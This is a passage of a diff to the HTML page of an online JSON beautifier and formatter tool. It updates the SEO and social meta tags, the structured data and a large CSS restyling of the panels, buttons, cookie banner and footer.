@@ -3,48 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSON Formatter & Beautifier | Vin Nesia</title>
-    <meta name="description" content="Format, beautify, minify, and validate your JSON instantly. Fast and secure JSON formatter tool by Vin Nesia.">
-    <meta name="keywords" content="JSON beautifier, JSON formatter, JSON validator, format JSON online, JSON tools, beautify JSON Indonesia">
+    <title>JSON Formatter & Beautifier Online | Free JSON Validator & Minifier Tool</title>
+    <meta name="description" content="Professional JSON beautifier, formatter, validator and minifier tool. Format, validate, beautify and minify JSON data instantly. Free online JSON tools for developers worldwide.">
+    <meta name="keywords" content="JSON beautifier, JSON formatter, JSON validator, JSON minifier, format JSON online, beautify JSON, validate JSON, JSON tools, online JSON editor, free JSON formatter">
     <meta name="author" content="VIN NESIA">
-    <meta name="robots" content="index, follow">
-    <meta name="referrer" content="no-referrer-when-downgrade" />
-    <meta property="og:title" content="JSON Beautifier Online - Format & Beautify JSON Instantly">
-    <meta property="og:description" content="Free and online JSON Beautifier to tidy up JSON files. Just paste and click Beautify! Supports file uploads.">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="JSON Beautifier Online - Professional JSON Formatter & Validator">
+    <meta property="og:description" content="Free professional JSON beautifier and formatter tool. Validate, format, beautify and minify JSON data instantly. Perfect for developers and API testing.">
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://json.vinnesia.my.id">
-    <meta property="og:image" content="https://json.vinnesia.my.id/logo.png">
-    <meta property="og:site_name" content="VIN NESIA JSON Beautifier">
+    <meta property="og:image" content="https://json.vinnesia.my.id/og-image.png">
+    <meta property="og:image:alt" content="JSON Beautifier Tool Interface">
+    <meta property="og:site_name" content="VIN NESIA JSON Tools">
+    <meta property="og:locale" content="en_US">
     
+    <!-- Twitter Card Meta Tags -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="JSON Beautifier Online - Format & Beautify JSON Instantly">
-    <meta name="twitter:description" content="Free and online JSON Beautifier to tidy up JSON files. Just paste and click Beautify!">
-    <meta name="twitter:image" content="https://json.vinnesia.my.id/logo.png">
-    <meta name="4b5006bcadeaebb05474cb1a14058559cf8a10ea" content="4b5006bcadeaebb05474cb1a14058559cf8a10ea" />
+    <meta name="twitter:title" content="JSON Beautifier Online - Professional JSON Formatter & Validator">
+    <meta name="twitter:description" content="Free professional JSON beautifier and formatter tool. Validate, format, beautify and minify JSON data instantly.">
+    <meta name="twitter:image" content="https://json.vinnesia.my.id/twitter-card.png">
+    <meta name="twitter:image:alt" content="JSON Beautifier Tool">
+    <meta name="twitter:site" content="@vinnesia">
+    <meta name="twitter:creator" content="@vinnesia">
+    
+    <!-- Additional SEO Meta Tags -->
+    <meta name="theme-color" content="#8b5cf6">
+    <meta name="msapplication-TileColor" content="#8b5cf6">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="JSON Beautifier">
+    
+    <!-- Favicon and Icons -->
     <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="manifest" href="manifest.json">
+    
+    <!-- Canonical URL -->
     <link rel="canonical" href="https://json.vinnesia.my.id">
     
+    <!-- Preconnect for Performance -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    
+    <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <!-- External Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js" defer></script>
     
+    <!-- Structured Data -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "SoftwareApplication",
         "name": "JSON Beautifier Online",
-        "operatingSystem": "Web",
-        "applicationCategory": "DeveloperApplication",
-        "description": "Beautify and format JSON instantly in your browser. Paste, upload, or download clean JSON output.",
+        "description": "Professional JSON beautifier, formatter, validator and minifier tool. Format, validate, beautify and minify JSON data instantly with our free online tool.",
         "url": "https://json.vinnesia.my.id",
+        "applicationCategory": "DeveloperApplication",
+        "operatingSystem": "Web Browser",
+        "browserRequirements": "Modern web browser with JavaScript enabled",
+        "permissions": "No special permissions required",
+        "softwareVersion": "2.0",
+        "dateModified": "2025-08-11",
+        "author": {
+            "@type": "Organization",
+            "name": "VIN NESIA",
+            "url": "https://www.vinnesia.my.id"
+        },
         "offers": {
             "@type": "Offer",
             "price": "0",
-            "priceCurrency": "USD"
-        }
+            "priceCurrency": "USD",
+            "availability": "https://schema.org/InStock"
+        },
+        "featureList": [
+            "JSON Beautification",
+            "JSON Validation", 
+            "JSON Minification",
+            "File Upload Support",
+            "ZIP File Processing",
+            "Copy to Clipboard",
+            "Download Formatted JSON",
+            "Drag and Drop Interface"
+        ],
+        "screenshot": "https://json.vinnesia.my.id/screenshot.png"
     }
     </script>
     
+    <!-- Additional Schema for WebApplication -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "WebApplication",
+        "name": "JSON Beautifier",
+        "url": "https://json.vinnesia.my.id",
+        "description": "Free online JSON beautifier and formatter tool for developers",
+        "browserRequirements": "Requires JavaScript",
+        "softwareVersion": "2.0",
+        "applicationCategory": "DeveloperApplication",
+        "operatingSystem": "Any"
+    }
+    </script>
+    
+    <!-- Analytics Setup -->
     <script>
         window.dataLayer = window.dataLayer || [];
         function gtag(){dataLayer.push(arguments);}
@@ -62,15 +129,22 @@
         :root {
             --primary-purple: #8b5cf6;
             --primary-green: #10b981;
-            --dark-bg: #1a1a2e;
-            --darker-bg: #16213e;
-            --darkest-bg: #0f3460;
+            --primary-blue: #3b82f6;
+            --dark-bg: #0f172a;
+            --darker-bg: #1e293b;
+            --darkest-bg: #334155;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --border-color: rgba(255, 255, 255, 0.12);
             --text-light: #ffffff;
-            --text-gray: #e5e5e5;
-            --text-muted: #a3a3a3;
+            --text-gray: #e2e8f0;
+            --text-muted: #94a3b8;
             --success-color: #10b981;
             --error-color: #ef4444;
             --warning-color: #f59e0b;
+            --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.1);
+            --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);
+            --shadow-xl: 0 20px 25px rgba(0, 0, 0, 0.15);
         }
         
         * {
@@ -80,23 +154,27 @@
         }
         
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, var(--dark-bg) 0%, var(--darker-bg) 50%, var(--darkest-bg) 100%);
             color: var(--text-light);
             min-height: 100vh;
             line-height: 1.6;
+            font-size: 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
         
         .container {
-            max-width: 1400px; /* Updated for desktop optimization */
+            max-width: 1440px;
             margin: 0 auto;
             padding: 20px;
         }
         
+        /* Header Styles */
         .header {
             text-align: center;
-            margin-bottom: 30px;
-            padding: 20px 0;
+            margin-bottom: 40px;
+            padding: 30px 0;
         }
         
         .logo {
@@ -104,114 +182,157 @@
             height: 80px;
             margin: 0 auto 20px;
             border-radius: 50%;
-            background: linear-gradient(45deg, var(--primary-purple), var(--primary-green));
+            background: linear-gradient(135deg, var(--primary-purple), var(--primary-green));
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 36px;
-            font-weight: bold;
+            font-weight: 700;
             color: white;
-            transition: transform 0.3s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: var(--shadow-lg);
         }
         
         .logo:hover {
-            transform: scale(1.05);
+            transform: scale(1.05) rotate(5deg);
+            box-shadow: var(--shadow-xl);
         }
         
         .site-title {
-            font-size: 2.5rem;
+            font-size: clamp(1.8rem, 4vw, 2.8rem);
             font-weight: 700;
-            background: linear-gradient(45deg, var(--primary-purple), var(--primary-green));
+            background: linear-gradient(135deg, var(--primary-purple), var(--primary-green), var(--primary-blue));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
+            letter-spacing: -0.02em;
+        }
+        
+        .subtitle {
+            font-size: clamp(1rem, 2vw, 1.2rem);
+            color: var(--text-muted);
+            margin-bottom: 25px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
         }
         
         .back-btn {
-            display: inline-block;
-            padding: 10px 20px;
-            background: linear-gradient(45deg, #6366f1, var(--primary-purple));
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            background: linear-gradient(135deg, var(--primary-blue), var(--primary-purple));
             color: white;
             text-decoration: none;
-            border-radius: 8px;
-            margin-bottom: 20px;
+            border-radius: 12px;
             font-weight: 500;
-            transition: all 0.3s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: var(--shadow-md);
         }
         
         .back-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(139, 92, 246, 0.3);
+            box-shadow: var(--shadow-xl);
         }
         
-        h1 {
-            font-size: 2rem;
-            margin-bottom: 20px;
-            color: var(--primary-green);
-        }
-        
+        /* Main Content Layout */
         .main-content {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 30px;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
         }
         
         .panel {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            padding: 25px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            transition: transform 0.2s ease;
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: var(--shadow-lg);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary-purple), var(--primary-green), var(--primary-blue));
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
         
         .panel:hover {
-            transform: translateY(-2px);
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-xl);
+        }
+        
+        .panel:hover::before {
+            opacity: 1;
         }
         
         .panel h2 {
             color: var(--primary-purple);
-            margin-bottom: 15px;
-            font-size: 1.3rem;
+            margin-bottom: 20px;
+            font-size: clamp(1.2rem, 2vw, 1.4rem);
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
+        /* Form Elements */
         textarea {
             width: 100%;
-            min-height: 300px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 2px solid rgba(139, 92, 246, 0.3);
-            border-radius: 12px;
+            min-height: 350px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid var(--border-color);
+            border-radius: 16px;
             color: var(--text-light);
-            font-family: 'Courier New', monospace;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
             font-size: 14px;
+            line-height: 1.5;
             resize: vertical;
-            transition: border-color 0.3s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            outline: none;
         }
         
         textarea:focus {
-            outline: none;
             border-color: var(--primary-purple);
-            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
+            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15);
+            background: rgba(0, 0, 0, 0.5);
         }
         
+        textarea::placeholder {
+            color: var(--text-muted);
+            opacity: 0.8;
+        }
+        
+        /* File Upload */
         .file-upload {
-            margin-bottom: 20px;
-            padding: 20px;
-            border: 2px dashed rgba(139, 92, 246, 0.3);
-            border-radius: 12px;
+            margin-bottom: 25px;
+            padding: 30px;
+            border: 2px dashed var(--border-color);
+            border-radius: 16px;
             text-align: center;
-            transition: all 0.3s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
+            background: rgba(255, 255, 255, 0.02);
         }
         
         .file-upload:hover,
         .file-upload.dragover {
             border-color: var(--primary-purple);
-            background: rgba(139, 92, 246, 0.1);
+            background: rgba(139, 92, 246, 0.08);
+            transform: translateY(-2px);
         }
         
         .file-upload input[type="file"] {
@@ -219,79 +340,135 @@
         }
         
         .upload-text {
-            color: var(--text-muted);
+            color: var(--text-gray);
             margin-bottom: 10px;
         }
         
+        .upload-text strong {
+            color: var(--primary-green);
+            font-size: 1.1em;
+        }
+        
+        .upload-text small {
+            display: block;
+            margin-top: 8px;
+            color: var(--text-muted);
+            font-size: 0.9em;
+        }
+        
         .file-info {
-            margin-top: 15px;
-            padding: 10px;
-            background: rgba(16, 185, 129, 0.1);
-            border-radius: 8px;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 12px;
             font-size: 0.9rem;
             color: var(--primary-green);
         }
         
+        /* Messages */
         .error-message, .success-message {
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 15px;
+            padding: 16px 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
             border-left: 4px solid;
             display: none;
+            font-weight: 500;
+            animation: slideIn 0.3s ease;
         }
         
         .error-message {
-            background: rgba(239, 68, 68, 0.1);
+            background: rgba(239, 68, 68, 0.15);
             color: var(--error-color);
             border-left-color: var(--error-color);
         }
         
         .success-message {
-            background: rgba(16, 185, 129, 0.1);
+            background: rgba(16, 185, 129, 0.15);
             color: var(--success-color);
             border-left-color: var(--success-color);
         }
         
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Buttons */
         .button-group {
             display: flex;
             gap: 15px;
-            margin-top: 20px;
+            margin-top: 25px;
             flex-wrap: wrap;
         }
         
         .btn {
-            padding: 12px 24px;
+            padding: 14px 28px;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             cursor: pointer;
-            font-weight: 500;
-            font-size: 16px;
-            transition: all 0.3s ease;
+            font-weight: 600;
+            font-size: 15px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             text-decoration: none;
-            display: inline-block;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
             text-align: center;
             user-select: none;
+            position: relative;
+            overflow: hidden;
+            min-width: 120px;
+            justify-content: center;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
         }
         
         .btn-primary {
-            background: linear-gradient(45deg, var(--primary-purple), #a855f7);
+            background: linear-gradient(135deg, var(--primary-purple), #a855f7);
             color: white;
+            box-shadow: var(--shadow-md);
         }
         
         .btn-success {
-            background: linear-gradient(45deg, var(--primary-green), #059669);
+            background: linear-gradient(135deg, var(--primary-green), #059669);
             color: white;
+            box-shadow: var(--shadow-md);
         }
         
         .btn-secondary {
             background: rgba(255, 255, 255, 0.1);
             color: var(--text-light);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow-sm);
+        }
+        
+        .btn-info {
+            background: linear-gradient(135deg, var(--primary-blue), #2563eb);
+            color: white;
+            box-shadow: var(--shadow-md);
         }
         
         .btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.3);
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-xl);
+        }
+        
+        .btn:active:not(:disabled) {
+            transform: translateY(-1px);
         }
         
         .btn:disabled {
@@ -301,86 +478,168 @@
             box-shadow: none;
         }
         
+        /* Features Section */
+        .features-section {
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 40px 0;
+            text-align: center;
+        }
+        
+        .features-section h3 {
+            color: var(--primary-purple);
+            margin-bottom: 15px;
+            font-size: clamp(1.4rem, 3vw, 1.8rem);
+            font-weight: 600;
+        }
+        
+        .features-section p {
+            color: var(--text-gray);
+            margin-bottom: 30px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            font-size: 1.1em;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 25px;
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .feature-icon {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+            display: block;
+        }
+        
+        .feature-card h4 {
+            color: var(--primary-green);
+            margin-bottom: 10px;
+            font-size: 1.2em;
+            font-weight: 600;
+        }
+        
+        .feature-card p {
+            color: var(--text-muted);
+            font-size: 0.95em;
+            line-height: 1.6;
+        }
+        
         /* Newsletter Section */
         .newsletter-section {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            padding: 30px;
-            margin: 30px 0;
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 40px 0;
             text-align: center;
         }
         
         .newsletter-section h3 {
             color: var(--primary-purple);
-            margin-bottom: 10px;
-            font-size: 1.5rem;
+            margin-bottom: 15px;
+            font-size: clamp(1.3rem, 2.5vw, 1.6rem);
+            font-weight: 600;
         }
         
         .newsletter-section p {
             color: var(--text-gray);
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
         }
         
         .newsletter-form {
             display: flex;
-            gap: 10px;
-            max-width: 400px;
+            gap: 15px;
+            max-width: 450px;
             margin: 0 auto;
             flex-wrap: wrap;
         }
         
         .newsletter-input {
             flex: 1;
-            padding: 12px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 2px solid rgba(139, 92, 246, 0.3);
-            border-radius: 8px;
+            padding: 16px 20px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
             color: var(--text-light);
-            font-size: 14px;
-            min-width: 250px;
+            font-size: 15px;
+            min-width: 280px;
+            transition: all 0.3s ease;
         }
         
         .newsletter-input:focus {
             outline: none;
             border-color: var(--primary-purple);
+            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15);
         }
         
         .newsletter-btn {
-            background: linear-gradient(45deg, var(--primary-green), #059669);
+            background: linear-gradient(135deg, var(--primary-green), #059669);
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
+            padding: 16px 24px;
+            border-radius: 12px;
             cursor: pointer;
-            font-weight: 500;
-            transition: all 0.3s ease;
+            font-weight: 600;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            min-width: 140px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         
         .newsletter-btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
         }
         
         /* File Preview */
         .file-preview {
-            margin-top: 15px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 8px;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
             font-size: 0.9rem;
             display: none;
+            border: 1px solid var(--border-color);
         }
         
         .file-list {
             list-style: none;
-            margin: 10px 0;
+            margin: 15px 0;
         }
         
         .file-list li {
-            padding: 5px 0;
+            padding: 8px 0;
             color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         
         .file-list li.valid {
@@ -391,19 +650,19 @@
             color: var(--error-color);
         }
         
-        /* Cookie Consent Banner */
+        /* Cookie Banner */
         .cookie-banner {
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
             background: rgba(0, 0, 0, 0.95);
-            backdrop-filter: blur(10px);
-            border-top: 1px solid rgba(139, 92, 246, 0.3);
-            padding: 20px;
+            backdrop-filter: blur(15px);
+            border-top: 1px solid var(--border-color);
+            padding: 25px;
             z-index: 1000;
             transform: translateY(100%);
-            transition: transform 0.3s ease;
+            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
         }
         
         .cookie-banner.show {
@@ -416,30 +675,32 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            gap: 20px;
+            gap: 25px;
             flex-wrap: wrap;
         }
         
         .cookie-text {
             flex: 1;
-            min-width: 300px;
+            min-width: 320px;
         }
         
         .cookie-text h4 {
             color: var(--primary-purple);
-            font-size: 1.1rem;
-            margin-bottom: 8px;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            font-weight: 600;
         }
         
         .cookie-text p {
             color: var(--text-gray);
-            font-size: 0.9rem;
-            line-height: 1.4;
+            font-size: 1rem;
+            line-height: 1.5;
         }
         
         .cookie-text a {
             color: var(--primary-green);
             text-decoration: none;
+            font-weight: 500;
         }
         
         .cookie-text a:hover {
@@ -448,43 +709,46 @@
         
         .cookie-buttons {
             display: flex;
-            gap: 12px;
+            gap: 15px;
             flex-wrap: wrap;
         }
         
         .cookie-btn {
-            padding: 10px 20px;
+            padding: 12px 20px;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             cursor: pointer;
-            font-weight: 500;
+            font-weight: 600;
             font-size: 14px;
-            transition: all 0.3s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
         
         .cookie-btn-accept {
-            background: linear-gradient(45deg, var(--success-color), #059669);
+            background: linear-gradient(135deg, var(--success-color), #059669);
             color: white;
         }
         
         .cookie-btn-decline {
-            background: rgba(239, 68, 68, 0.8);
+            background: linear-gradient(135deg, var(--error-color), #dc2626);
             color: white;
         }
         
         .cookie-btn-settings {
             background: rgba(255, 255, 255, 0.1);
             color: var(--text-light);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border: 1px solid var(--border-color);
         }
         
         .cookie-btn:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-md);
         }
         
-        /* Cookie Settings Modal */
+        /* Cookie Modal */
         .cookie-modal {
             position: fixed;
             top: 0;
@@ -492,7 +756,7 @@
             right: 0;
             bottom: 0;
             background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(8px);
             z-index: 1001;
             display: none;
             align-items: center;
@@ -505,43 +769,47 @@
         }
         
         .cookie-modal-content {
-            background: rgba(26, 26, 46, 0.95);
+            background: var(--darker-bg);
             backdrop-filter: blur(20px);
-            border: 1px solid rgba(139, 92, 246, 0.3);
-            border-radius: 16px;
-            padding: 30px;
-            max-width: 600px;
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 650px;
             width: 100%;
-            max-height: 80vh;
+            max-height: 85vh;
             overflow-y: auto;
+            box-shadow: var(--shadow-xl);
         }
         
         .cookie-modal h3 {
             color: var(--primary-purple);
-            margin-bottom: 20px;
-            font-size: 1.4rem;
+            margin-bottom: 25px;
+            font-size: 1.5rem;
+            font-weight: 600;
         }
         
         .cookie-category {
-            margin-bottom: 20px;
-            padding: 15px;
+            margin-bottom: 25px;
+            padding: 20px;
             background: rgba(255, 255, 255, 0.05);
-            border-radius: 8px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
         }
         
         .cookie-category h4 {
             color: var(--primary-green);
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            font-weight: 600;
         }
         
         .cookie-toggle {
             position: relative;
             display: inline-block;
-            width: 50px;
-            height: 24px;
+            width: 54px;
+            height: 28px;
         }
         
         .cookie-toggle input {
@@ -557,21 +825,22 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background-color: #666;
-            transition: 0.3s;
-            border-radius: 24px;
+            background-color: #64748b;
+            transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            border-radius: 28px;
         }
         
         .cookie-slider:before {
             position: absolute;
             content: "";
-            height: 18px;
-            width: 18px;
+            height: 22px;
+            width: 22px;
             left: 3px;
             bottom: 3px;
             background-color: white;
-            transition: 0.3s;
+            transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
             border-radius: 50%;
+            box-shadow: var(--shadow-sm);
         }
         
         .cookie-toggle input:checked + .cookie-slider {
@@ -582,50 +851,142 @@
             transform: translateX(26px);
         }
         
+        .cookie-toggle input:disabled + .cookie-slider {
+            background-color: #475569;
+            cursor: not-allowed;
+        }
+        
         .cookie-category p {
-            color: #ccc;
-            font-size: 0.9rem;
-            margin-top: 5px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-top: 8px;
+            line-height: 1.5;
         }
         
         .cookie-modal-buttons {
             display: flex;
-            gap: 12px;
+            gap: 15px;
             justify-content: flex-end;
-            margin-top: 25px;
+            margin-top: 30px;
             flex-wrap: wrap;
         }
         
+        /* Footer */
         .footer {
             text-align: center;
-            padding: 30px 0;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            margin-top: 50px;
+            padding: 40px 0;
+            border-top: 1px solid var(--border-color);
+            margin-top: 60px;
+            background: rgba(255, 255, 255, 0.02);
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
         }
         
         .footer a {
             color: var(--primary-green);
             text-decoration: none;
-            margin: 0 15px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            padding: 8px 12px;
+            border-radius: 8px;
         }
         
         .footer a:hover {
-            text-decoration: underline;
+            background: rgba(16, 185, 129, 0.1);
+            transform: translateY(-1px);
+        }
+        
+        .footer-separator {
+            color: var(--text-muted);
+            font-weight: 300;
+        }
+        
+        .copyright {
+            color: var(--text-muted);
+            font-size: 0.9em;
+            margin-top: 15px;
+        }
+        
+        /* Scroll to Top Button */
+        .scroll-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: linear-gradient(135deg, var(--primary-purple), var(--primary-green));
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 56px;
+            height: 56px;
+            cursor: pointer;
+            font-size: 24px;
+            font-weight: 600;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            opacity: 0;
+            visibility: hidden;
+            z-index: 999;
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .scroll-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .scroll-top:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: var(--shadow-xl);
+        }
+        
+        /* Loading Animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary-purple);
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
         
         /* Responsive Design */
+        @media (max-width: 1024px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .main-content {
+                gap: 25px;
+            }
+            
+            .panel {
+                padding: 25px;
+            }
+        }
+        
         @media (max-width: 768px) {
             .container {
                 padding: 15px;
             }
             
-            .site-title {
-                font-size: 2rem;
-            }
-            
             .main-content {
                 grid-template-columns: 1fr;
                 gap: 20px;
+            }
+            
+            .panel {
+                padding: 20px;
             }
             
             .button-group {
@@ -634,25 +995,33 @@
             
             .btn {
                 width: 100%;
+                min-width: auto;
             }
             
             textarea {
-                min-height: 250px;
+                min-height: 280px;
+                font-size: 13px;
             }
             
             .newsletter-form {
                 flex-direction: column;
-                align-items: center;
+                align-items: stretch;
             }
             
             .newsletter-input {
                 width: 100%;
-                margin-bottom: 10px;
+                margin-bottom: 15px;
+                min-width: auto;
+            }
+            
+            .newsletter-btn {
+                width: 100%;
             }
             
             .cookie-content {
                 flex-direction: column;
                 text-align: center;
+                gap: 20px;
             }
             
             .cookie-buttons {
@@ -666,251 +1035,390 @@
             }
             
             .cookie-modal-content {
-                margin: 10px;
-                padding: 20px;
+                margin: 15px;
+                padding: 25px;
             }
             
             .cookie-modal-buttons {
                 flex-direction: column;
             }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
